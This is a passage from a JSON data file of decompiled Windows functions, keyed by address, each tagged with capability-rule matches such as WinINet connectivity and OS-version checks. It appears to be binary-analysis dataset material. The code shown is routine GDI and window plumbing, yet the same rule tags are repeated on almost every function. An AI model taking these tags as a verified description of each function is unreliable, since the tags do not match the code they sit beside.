NULL) {\n                    *arg_18h = var_18h;\n                    arg_18h[1] = var_14h;\n                }\n                return;\n            }\n        }\n        else if (arg_14h < 1) goto code_r0x004235f7;\n        uVar1 = arg_10h;\n        if (arg_14h == 0) {\n            if (0x7fffffff < arg_10h) {\ncode_r0x0042351d:\n                uVar1 = 0x7fffffff;\n            }\n        }\n        else if (0 < arg_14h) goto code_r0x0042351d;\n        for (; 0 < uVar1; uVar1 = uVar1 - uVar2) {\n            var_10h = uVar1;\n            if (var_ch < uVar1) {\n                var_10h = var_ch;\n            }\n            uVar2 = (**(**(arg_8h + 0xc) + 0xc))();\n            if (uVar2 == 0) {\n                fcn.0040406c();\n                *in_FS_OFFSET = uStack92;\ncode_r0x00423659:\n                *in_FS_OFFSET = uStack80;\n                puStack72 = 0x423676;\n                uStack76 = 0x42366e;\n                fcn.00406298();\n                return;\n            }\n            bVar3 = CARRY4(var_18h, uVar2);\n            var_18h = var_18h + uVar2;\n            var_14h = var_14h + (uVar2 >> 0x1f) + bVar3;\n            var_28h = 0;\n            var_24h = 0;\n            var_4h = (**(*arg_ch + 0x10))(arg_ch, var_8h, uVar2, &fcn.0042347c::var_28h);\n            bVar3 = CARRY4(var_20h, var_28h);\n            var_20h = var_20h + var_28h;\n            var_1ch = var_1ch + var_24h + bVar3;\n            if ((var_4h == 0) && (uVar2 != var_28h)) {\n                var_4h = -0x7fffbffb;\n            }\n            if (var_4h != 0) {\n                fcn.0040406c();\n                *in_FS_OFFSET = uStack92;\n                goto code_r0x00423659;\n            }\n            bVar3 = arg_10h < uVar2;\n            arg_10h = arg_10h - uVar2;\n            arg_14h = (arg_14h - (uVar2 >> 0x1f)) - bVar3;\n        }\n    } while( true );\n}\n",
        "token_count": 1310
    },
    "004237bc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004237bc(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint *arg_ch;\n    uint uStack324;\n    uint uStack320;\n    uchar *puStack316;\n    uint uStack312;\n    uint uStack308;\n    uchar *puStack304;\n    uint var_114h;\n    uint var_110h;\n    uint *var_10h;\n    uint var_ch;\n    int32_t *var_5h;\n    \n    if (param_2 != '\\0') {\n        puStack304 = 0x4237da;\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    uStack308 = 0x4238d4;\n    uStack312 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffec8;\n    puStack316 = 0x4237fa;\n    puStack304 = &stack0xfffffffc;\n    var_5h._0_1_ = param_2;\n    unique0x100000d6 = in_EAX;\n    (**(**0x48584c + 0x14))();\n    uStack320 = 0x4238b4;\n    uStack324 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffebc;\n    puStack316 = &stack0xfffffffc;\n    (**(*stack0xfffffff8 + 0x38))();\n    iVar2 = fcn.00403764();\n    if ((iVar2 != *0x41aef8) && ((*(stack0xfffffff8 + 7) & 0x10) == 0)) {\n        cVar1 = fcn.0041c274();\n        if (cVar1 == '\\0') {\n            fcn.00403770();\n            var_10h = &fcn.004237bc::var_110h;\n            var_ch._0_1_ = 4;\n            arg_ch = &fcn.004237bc::var_10h;\n            arg_8h = 0;\n            fcn.0040675c();\n            fcn.0040c918(arg_8h, arg_ch);\n            fcn.00403fc0();\n        }\n        if (*(stack0xfffffff8 + 0x14) != '\\0') {\n            (**(*stack0xfffffff8 + 0x30))();\n        }\n    }\n    *in_FS_OFFSET = 0;\n    uStack320 = 0x4238bb;\n    uStack324 = 0x4238b3;\n    (**(**0x48584c + 0x18))();\n    return;\n}\n",
        "token_count": 628
    },
    "00423908": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00423908(int32_t arg_8h)\n\n{\n    uint in_EAX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00403b58();\n        in_DL = extraout_DL;\n    }\n    fcn.0042273c();\n    if ((*0x4835a2 != 0) && (-1 < arg_8h)) {\n        (**0x4835a0)();\n    }\n    if (in_DL != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 164
    },
    "00423990": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00423990(void)\n\n{\n    uchar extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    int32_t *var_5h;\n    \n    puStack16 = 0x42399b;\n    *NULL = fcn.00403bc0();\n    var_5h._0_1_ = extraout_DL;\n    if ((*(*NULL + 7) & 8) == 0) {\n        puStack16 = 0x4239b4;\n        (**(**0x48584c + 0x14))();\n    }\n    uStack20 = 0x423a12;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    if (*(stack0xfffffff8 + 0x14) != '\\0') {\n        puStack16 = &stack0xfffffffc;\n        (**(*stack0xfffffff8 + 0x34))();\n    }\n    if (*0x4835aa != 0) {\n        (**0x4835a8)();\n    }\n    fcn.00422788();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x423a19;\n    uStack20 = 0x423a11;\n    (**(**0x48584c + 0x18))();\n    return;\n}\n",
        "token_count": 329
    },
    "00423a2c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00423a2c(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    if (*(in_EAX + 0x42) != 0) {\n        uStack28 = 0x423a64;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack32;\n        (**(in_EAX + 0x40))();\n        *in_FS_OFFSET = uStack32;\n    }\n    return;\n}\n",
        "token_count": 145
    },
    "00423a8c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00423a8c(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    if (*(in_EAX + 0x4a) != 0) {\n        uStack28 = 0x423ac4;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack32;\n        (**(in_EAX + 0x48))();\n        *in_FS_OFFSET = uStack32;\n    }\n    return;\n}\n",
        "token_count": 146
    },
    "00423af0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00423af0(int32_t arg_8h)\n\n{\n    bool bVar1;\n    \n    bVar1 = true;\n    if (*(arg_8h + -4) != 0) {\n        bVar1 = *(*(arg_8h + -8) + 0x30) != *(*(arg_8h + -4) + 0x30);\n    }\n    return bVar1;\n}\n",
        "token_count": 97
    },
    "00423b18": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00423b18(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    \n    if (*(arg_8h + -4) != 0) {\n        uVar1 = *(*(arg_8h + -8) + 0x38);\n        return uVar1 & 0xffffff00 | uVar1 != *(*(arg_8h + -4) + 0x38);\n    }\n    return *(arg_8h + -8) & 0xffffff00 | *(*(arg_8h + -8) + 0x38) != 0;\n}\n",
        "token_count": 139
    },
    "00423b4c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00423b4c(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    \n    if (*(arg_8h + -4) != 0) {\n        uVar1 = *(*(arg_8h + -8) + 0x3c);\n        return uVar1 & 0xffffff00 | uVar1 != *(*(arg_8h + -4) + 0x3c);\n    }\n    return *(arg_8h + -8) & 0xffffff00 | *(*(arg_8h + -8) + 0x3c) != 0;\n}\n",
        "token_count": 143
    },
    "00423b80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00423b80(int32_t arg_8h)\n\n{\n    bool bVar1;\n    \n    bVar1 = true;\n    if (*(arg_8h + -4) != 0) {\n        bVar1 = *(*(arg_8h + -8) + 0x34) != *(*(arg_8h + -4) + 0x34);\n    }\n    return bVar1;\n}\n",
        "token_count": 97
    },
    "00423e04": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.00423e04(uint arg_8h, uint arg_ch)\n\n{\n    uchar *puVar1;\n    uint *puVar2;\n    uint uVar3;\n    uchar *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar2 = *0x485884;\n    if (*0x485888 == NULL) {\n        puVar2 = sub.kernel32.dll_VirtualAlloc_1(0, 0x1000, 0x1000, 0x40);\n        *puVar2 = *0x485884;\n        fcn.00402d34();\n        uVar3 = fcn.00423dfc();\n        *(puVar2 + 6) = uVar3;\n        var_ch = puVar2 + 10;\n        do {\n            *var_ch = 0xe8;\n            uVar3 = fcn.00423dfc();\n            *(var_ch + 1) = uVar3;\n            *(var_ch + 5) = *0x485888;\n            *0x485888 = var_ch;\n            var_ch = var_ch + 0xd;\n        } while (var_ch - puVar2 < 0xffc);\n    }\n    *0x485884 = puVar2;\n    puVar1 = *0x485888;\n    puVar2 = *0x485888 + 5;\n    *0x485888 = *(*0x485888 + 5);\n    *puVar2 = arg_8h;\n    *(puVar1 + 9) = arg_ch;\n    return puVar1;\n}\n",
        "token_count": 355
    },
    "00423ef8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00423ef8(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint lpWndClass;\n    code *var_24h;\n    \n    *0x4835ec = *0x485668;\n    iVar1 = sub.user32.dll_GetClassInfoA(*0x485668, *0x483600, &lpWndClass);\n    if ((iVar1 == 0) || (var_24h != sub.user32.dll_DefWindowProcA)) {\n        if (iVar1 != 0) {\n            sub.user32.dll_UnregisterClassA(*0x483600, *0x485668);\n        }\n        sub.user32.dll_RegisterClassA(0x4835dc);\n    }\n    uVar2 = fcn.00407634(0, *0x485668, 0, 0, 0, 0, 0, 0, 0x80000000);\n    if (arg_8h._2_2_ != 0) {\n        uVar3 = fcn.00423e04(arg_8h, arg_ch);\n        sub.user32.dll_SetWindowLongA(uVar2, 0xfffffffc, uVar3);\n    }\n    return uVar2;\n}\n",
        "token_count": 288
    },
    "00425484": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00425484(uint param_1, uint *param_2)\n\n{\n    char cVar1;\n    int16_t iVar2;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint *var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x42549f;\n    iVar2 = fcn.004253f8();\n    puStack24 = 0x4254a9;\n    fcn.0042546c();\n    uStack28 = 0x425558;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    for (var_8h = *(in_EAX + 4); var_8h != NULL; var_8h = *var_8h) {\n        if (iVar2 == *(var_8h + 3)) {\n            cVar1 = fcn.00408980();\n            if (cVar1 != '\\0') break;\n        }\n    }\n    if (var_8h == NULL) {\n        var_8h = fcn.00402b14();\n        *var_8h = *(in_EAX + 4);\n        var_8h[1] = 0;\n        var_8h[2] = *param_2;\n        *(var_8h + 3) = iVar2;\n        fcn.00402d34();\n        *(in_EAX + 4) = var_8h;\n    }\n    var_8h[1] = var_8h[1] + 1;\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x42555f;\n    uStack28 = 0x425557;\n    fcn.00425478();\n    return;\n}\n",
        "token_count": 426
    },
    "00425568": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00425568(uint param_1, uint *param_2)\n\n{\n    uint *puVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint *var_14h;\n    uint *var_dh;\n    uint *var_8h;\n    int32_t var_4h;\n    \n    if (param_2 == NULL) {\n        return;\n    }\n    uStack28 = 0x42558c;\n    var_14h = param_2;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    fcn.0042546c();\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    var_14h[1] = var_14h[1] + -1;\n    var_dh._0_1_ = var_14h[1] == 0;\n    if (var_dh._0_1_) {\n        puVar1 = *(var_4h + 4);\n        if (*(var_4h + 4) == var_8h) {\n            *(var_4h + 4) = *var_8h;\n        }\n        else {\n            do {\n                stack0xfffffff0 = puVar1;\n                puVar1 = *stack0xfffffff0;\n            } while (*stack0xfffffff0 != var_8h);\n            *stack0xfffffff0 = *var_8h;\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    uStack28 = 0x425602;\n    uStack32 = 0x4255fa;\n    fcn.00425478();\n    return;\n}\n",
        "token_count": 404
    },
    "00425710": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00425710(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t in_EAX;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x425727;\n    fcn.0042546c();\n    uStack32 = 0x42577d;\n    iVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    for (puVar2 = *(in_EAX + 4); puVar2 != NULL; puVar2 = *puVar2) {\n        iStack36 = puVar2[2];\n        if ((iStack36 != 0) && (puVar2[5] < 0)) {\n            sub.gdi32.dll_DeleteObject();\n            puVar2[2] = 0;\n            iVar1 = iStack36;\n        }\n        iStack36 = iVar1;\n        iVar1 = iStack36;\n    }\n    *in_FS_OFFSET = iVar1;\n    puStack28 = 0x425784;\n    uStack32 = 0x42577c;\n    iStack36 = iVar1;\n    fcn.00425478();\n    return;\n}\n",
        "token_count": 307
    },
    "00425ca8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00425ca8(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 10) != 0) {\n        (**(in_EAX + 8))();\n    }\n    return;\n}\n",
        "token_count": 53
    },
    "00425eb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00425eb0(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iStack104;\n    char cStack100;\n    char cStack99;\n    char cStack98;\n    uchar uStack97;\n    uint8_t uStack93;\n    \n    piVar2 = 0x483604;\n    piVar3 = param_2;\n    for (iVar1 = 0xb; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *piVar3 = *piVar2;\n        piVar2 = piVar2 + 1;\n        piVar3 = piVar3 + 1;\n    }\n    if (in_EAX != 0) {\n        iVar1 = sub.gdi32.dll_GetObjectA();\n        if (iVar1 != 0) {\n            param_2[1] = in_EAX;\n            if (699 < iStack104) {\n                *(param_2 + 9) = *(param_2 + 9) | 1;\n            }\n            if (cStack100 == '\\x01') {\n                *(param_2 + 9) = *(param_2 + 9) | 2;\n            }\n            if (cStack99 == '\\x01') {\n                *(param_2 + 9) = *(param_2 + 9) | 4;\n            }\n            if (cStack98 == '\\x01') {\n                *(param_2 + 9) = *(param_2 + 9) | 8;\n            }\n            *(param_2 + 10) = uStack97;\n            fcn.00403330();\n            fcn.00403098();\n            if ((uStack93 & 0xf) == 1) {\n                *(param_2 + 2) = 2;\n            }\n            else if ((uStack93 & 0xf) == 2) {\n                *(param_2 + 2) = 1;\n            }\n            else {\n                *(param_2 + 2) = 0;\n            }\n            *param_2 = in_EAX;\n        }\n    }\n    return;\n}\n",
        "token_count": 499
    },
    "0042664c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0042664c(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t *in_FS_OFFSET;\n    uint *puStack40;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = *(in_EAX + 0x10);\n    if (*(var_4h + 8) == 0) {\n        puStack28 = 0x42666b;\n        fcn.0042546c();\n        uStack32 = 0x4266d2;\n        iStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        puStack28 = &stack0xfffffffc;\n        if (*(var_4h + 8) == 0) {\n            var_14h = *(*(var_4h + 0x1c) * 2 + 0x483874);\n            var_10h = *(var_4h + 0x18);\n            puStack28 = &stack0xfffffffc;\n            var_8h = fcn.00425c78();\n            puStack40 = &fcn.0042664c::var_14h;\n            uVar1 = sub.gdi32.dll_CreatePenIndirect();\n            *(var_4h + 8) = uVar1;\n        }\n        *in_FS_OFFSET = puStack40;\n        uStack32 = 0x4266d9;\n        iStack36 = 0x4266d1;\n        uVar1 = fcn.00425478();\n        return uVar1;\n    }\n    return *(var_4h + 8);\n}\n",
        "token_count": 400
    },
    "00426904": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00426904(void)\n\n{\n    fcn.0042686c();\n    fcn.00426888();\n    return;\n}\n",
        "token_count": 32
    },
    "00426938": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00426938(void)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint *puStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = *(in_EAX + 0x10);\n    if (*(var_4h + 8) == 0) {\n        puStack24 = 0x42695b;\n        fcn.0042546c();\n        uStack28 = 0x426a05;\n        puStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        if (*(var_4h + 8) == 0) {\n            if (*(var_4h + 0x18) == NULL) {\n                var_8h = 0;\n                uVar1 = *(var_4h + 0x1c);\n                if (uVar1 == 0) {\n                    var_10h = 0;\n                    puStack24 = &stack0xfffffffc;\n                }\n                else if (uVar1 == 1) {\n                    var_10h = 1;\n                    puStack24 = &stack0xfffffffc;\n                }\n                else {\n                    var_10h = 2;\n                    var_8h = (uVar1 & 0x7f) - 2;\n                    puStack24 = &stack0xfffffffc;\n                }\n            }\n            else {\n                var_10h = 3;\n                puStack24 = &stack0xfffffffc;\n                (**(**(var_4h + 0x18) + 0x6c))();\n                var_8h = (**(**(var_4h + 0x18) + 100))();\n            }\n            var_ch = fcn.00425c78();\n            puStack32 = &fcn.00426938::var_10h;\n            uVar2 = sub.gdi32.dll_CreateBrushIndirect();\n            *(var_4h + 8) = uVar2;\n        }\n        *in_FS_OFFSET = puStack32;\n        puStack24 = 0x426a0c;\n        uStack28 = 0x426a04;\n        uVar2 = fcn.00425478();\n        return uVar2;\n    }\n    return *(var_4h + 8);\n}\n",
        "token_count": 554
    },
    "00426a20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00426a20(void)\n\n{\n    fcn.0042686c();\n    fcn.00426888();\n    return;\n}\n",
        "token_count": 33
    },
    "00426ee8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid fcn.00426ee8(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint uStack16;\n    uint var_1h;\n    \n    uStack16 = 0x4858c4;\n    puStack20 = 0x426ef9;\n    sub.kernel32.dll_EnterCriticalSection_1();\n    uStack24 = 0x426f34;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (*(in_EAX + 0x50) == 0) {\n        puStack20 = &fcn.00426ee8::var_1h + 1;\n        fcn.00426d58();\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x426f3b;\n    uStack24 = 0x4858c4;\n    uStack28 = 0x426f33;\n    sub.kernel32.dll_LeaveCriticalSection_1();\n    return;\n}\n",
        "token_count": 258
    },
    "00427454": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00427454(char param_1, uint *param_2)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffff44;\n    int32_t iStack116;\n    uint uStack112;\n    uchar *puStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint *puStack92;\n    int32_t iStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uint lpvObject;\n    uint var_30h;\n    uint var_2ch;\n    uint hdcDest;\n    int32_t var_18h;\n    int32_t hdc;\n    int32_t var_10h;\n    uint nWidth;\n    uint nHeight;\n    uint hgdiobj;\n    \n    nWidth = *param_2;\n    nHeight = param_2[1];\n    uStack72 = 0;\n    uStack76 = 0x427470;\n    hgdiobj = in_EAX;\n    var_18h = sub.gdi32.dll_CreateCompatibleDC();\n    uStack76 = 0;\n    puStack80 = 0x42747a;\n    hdcDest = sub.gdi32.dll_CreateCompatibleDC();\n    uStack84 = 0x4275a2;\n    iStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    puStack92 = &fcn.00427454::lpvObject;\n    uStack96 = 0x18;\n    uStack100 = hgdiobj;\n    uStack104 = 0x42749a;\n    puStack80 = &stack0xfffffffc;\n    sub.gdi32.dll_GetObjectA();\n    if (param_1 != '\\0') {\n        uStack104 = 0;\n        puStack108 = 0x1;\n        uStack112 = 1;\n        iStack116 = nHeight;\n        var_10h = sub.gdi32.dll_CreateBitmap(nWidth);\n        if (var_10h != 0) {\n            iVar1 = sub.gdi32.dll_SelectObject(var_18h, hgdiobj);\n            iVar2 = sub.gdi32.dll_SelectObject(hdcDest, var_10h);\n            sub.gdi32.dll_StretchBlt(hdcDest, 0, 0, nWidth, nHeight, var_18h, 0, 0, var_30h, var_2ch, 0xcc0020);\n            if (iVar1 != 0) {\n                in_stack_ffffff44 = var_18h;\n                sub.gdi32.dll_SelectObject(var_18h, iVar1);\n            }\n            if (iVar2 != 0) {\n                sub.gdi32.dll_SelectObject(hdcDest, iVar2);\n            }\n        }\n        *in_FS_OFFSET = in_stack_ffffff44;\n        sub.gdi32.dll_DeleteDC(var_18h, 0x4275a9);\n        sub.gdi32.dll_DeleteDC(hdcDest);\n        return;\n    }\n    uStack104 = 0;\n    puStack108 = 0x4274bd;\n    hdc = sub.user32.dll_GetDC();\n    if (hdc == 0) {\n        puStack108 = 0x4274cb;\n        fcn.0042739c();\n    }\n    uStack112 = 0x427511;\n    iStack116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff8c;\n    iVar1 = hdc;\n    puStack108 = &stack0xfffffffc;\n    var_10h = sub.gdi32.dll_CreateCompatibleBitmap(hdc, nWidth, nHeight);\n    if (var_10h == 0) {\n        fcn.0042739c();\n    }\n    *in_FS_OFFSET = iVar1;\n    sub.user32.dll_ReleaseDC(0, hdc, 0x427518);\n    return;\n}\n",
        "token_count": 876
    },
    "004275e8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
